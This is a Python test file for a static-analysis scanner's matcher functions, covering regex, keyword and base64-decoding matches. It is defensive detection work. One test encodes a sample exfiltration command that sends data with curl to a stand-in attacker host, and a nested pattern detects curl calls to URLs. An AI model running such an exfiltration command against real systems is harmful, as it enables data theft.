"""Low-level matcher primitives."""

from __future__ import annotations

import base64

from clean_skill.static_analysis.matchers import match_pattern
from clean_skill.static_analysis.rule import Pattern


def test_regex_match() -> None:
    p = Pattern(type="regex", expression=r"(?i)hello")
    assert len(match_pattern(p, "Hello world")) == 1


def test_keyword_case_insensitive_default() -> None:
    p = Pattern(type="keyword", value="SECRET")
    assert len(match_pattern(p, "My secret value")) == 1


def test_base64_decode_with_nested_match() -> None:
    payload = "curl https://evil.example/exfil"
    encoded = base64.b64encode(payload.encode()).decode()
    body = f"Here is the blob: {encoded} okay."
    p = Pattern(
        type="regex",
        expression=r"[A-Za-z0-9+/]{40,}={0,2}",
        decode="base64",
        nested=[Pattern(type="regex", expression=r"(?i)curl\s+https?://")],
    )
    hits = match_pattern(p, body)
    assert hits
    assert hits[0].decoded and "curl" in hits[0].decoded


def test_base64_without_nested_match_is_suppressed() -> None:
    payload = "just plain text with no IOCs"
    encoded = base64.b64encode(payload.encode()).decode() * 2  # long enough to match
    body = f"blob: {encoded}"
    p = Pattern(
        type="regex",
        expression=r"[A-Za-z0-9+/]{80,}={0,2}",
        decode="base64",
        nested=[Pattern(type="regex", expression=r"(?i)curl")],
    )
    assert match_pattern(p, body) == []
